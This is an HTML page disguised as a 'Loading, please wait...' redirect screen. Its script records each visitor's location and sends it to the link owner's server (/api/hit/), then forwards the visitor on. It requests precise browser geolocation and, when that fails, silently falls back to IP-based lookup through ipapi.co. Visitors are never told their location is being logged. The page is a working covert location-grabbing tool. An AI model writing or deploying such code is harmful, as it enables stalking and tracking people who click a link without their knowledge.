<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  min-height: 100vh;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
}

.container {
  text-align: center;
  padding: 20px;
}

.spinner {
  width: 50px;
  height: 50px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin: 0 auto 20px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

p {
  color: white;
  font-size: 16px;
  opacity: 0.9;
}
</style>
</head>
<body>
<div class="container">
  <div class="spinner"></div>
  <p>Loading, please wait...</p>
</div>

<script>
const linkId = window.location.pathname.split('/').pop();
let destUrl = 'https://google.com';
let locationSent = false;

// Get destination URL
fetch('/api/hits/' + linkId)
  .then(r => r.json())
  .then(d => { if (d.dest) destUrl = d.dest; })
  .catch(() => {});

function sendLocation(lat, lon, acc) {
  if (locationSent) return;
  locationSent = true;
  
  fetch('/api/hit/' + linkId, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ lat, lon, acc })
  }).catch(() => {});
  
  // Redirect after saving
  setTimeout(() => {
    window.location.href = destUrl;
  }, 500);
}

// IP-based geolocation fallback
function getIPLocation() {
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      if (data.latitude && data.longitude) {
        sendLocation(data.latitude, data.longitude, 5000);
      } else {
        sendLocation(null, null, null);
      }
    })
    .catch(() => {
      sendLocation(null, null, null);
    });
}

// Try HTML5 geolocation first
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      sendLocation(
        pos.coords.latitude,
        pos.coords.longitude,
        Math.round(pos.coords.accuracy)
      );
    },
    err => {
      // If HTML5 fails, try IP geolocation
      getIPLocation();
    },
    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
  );
} else {
  // No HTML5 support, use IP geolocation
  getIPLocation();
}
</script>
</body>
</html>
